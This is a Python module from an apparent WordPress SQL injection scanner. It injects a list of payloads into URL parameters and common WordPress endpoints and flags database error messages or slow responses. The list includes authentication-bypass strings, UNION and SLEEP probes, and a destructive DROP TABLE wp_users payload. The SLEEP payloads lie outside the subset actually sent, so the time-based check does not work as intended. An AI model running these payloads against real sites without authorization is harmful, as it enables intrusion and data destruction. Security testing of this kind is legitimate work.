#!/usr/bin/env python3
"""
SQL Injection vulnerability scanner for WordPress
"""

import re
import sys
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
sys.path.append('..')
from core.utils import print_info, print_vuln, send_request, normalize_url

# Common SQL injection payloads
SQL_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'; DROP TABLE wp_users; --",
    "' AND SLEEP(5)--",
    "' AND SLEEP(5) #",
    "admin' --",
    "' OR EXISTS(SELECT * FROM wp_users)--",
]

def scan_sql_injection(url):
    """
    Scan for SQL injection vulnerabilities
    Returns: list of vulnerable parameters
    """
    url = normalize_url(url)
    vulnerabilities = []
    
    # Parse URL for parameters
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        print_info("No URL parameters found for SQL injection testing")
        return vulnerabilities
    
    print_info(f"Testing {len(query_params)} parameters for SQL injection...")
    
    # Test each parameter
    for param in query_params.keys():
        print_info(f"Testing parameter: {param}")
        
        for payload in SQL_PAYLOADS[:10]:  # Test first 10 payloads
            # Create test URL with payload
            test_params = query_params.copy()
            test_params[param] = [payload]
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                test_query,
                parsed_url.fragment
            ))
            
            # Time-based detection
            start_time = time.time()
            response = send_request(test_url)
            response_time = time.time() - start_time
            
            # Check for SQL errors
            if response:
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-[0-9]{5}",
                    "PostgreSQL",
                    "SQLite",
                    "Microsoft.*ODBC",
                    "Microsoft.*OLE DB",
                    "Incorrect syntax near",
                    "Unclosed quotation mark",
                    "You have an error in your SQL syntax",
                    "Warning: mysql",
                    "Warning: mysqli",
                    "supplied argument is not a valid MySQL",
                    "Query failed",
                    "database error",
                    "SQLSTATE",
                    "division by zero"
                ]
                
                for error_pattern in sql_errors:
                    if re.search(error_pattern, response.text, re.IGNORECASE):
                        vuln_info = f"SQL Injection vulnerability found in parameter '{param}' with payload: {payload}"
                        vulnerabilities.append(vuln_info)
                        print_vuln(vuln_info)
                        break
                
                # Time-based detection
                if response_time > 5:  # Payload caused delay
                    vuln_info = f"Potential time-based SQL injection in parameter '{param}' (response time: {response_time:.2f}s)"
                    vulnerabilities.append(vuln_info)
                    print_vuln(vuln_info)
    
    # Test common WordPress SQL injection points
    common_endpoints = [
        f"{url}/?p=1",
        f"{url}/?cat=1",
        f"{url}/?tag=test",
        f"{url}/?s=test",
        f"{url}/?author=1",
        f"{url}/wp-json/wp/v2/posts/1",
    ]
    
    for endpoint in common_endpoints:
        for payload in SQL_PAYLOADS[:5]:
            test_url = f"{endpoint}{payload}"
            response = send_request(test_url)
            
            if response:
                # Check for SQL errors in response
                if re.search(r"SQL syntax|mysql_fetch|database error", response.text, re.IGNORECASE):
                    vuln_info = f"SQL Injection vulnerability found at {test_url}"
                    vulnerabilities.append(vuln_info)
                    print_vuln(vuln_info)
    
    return vulnerabilities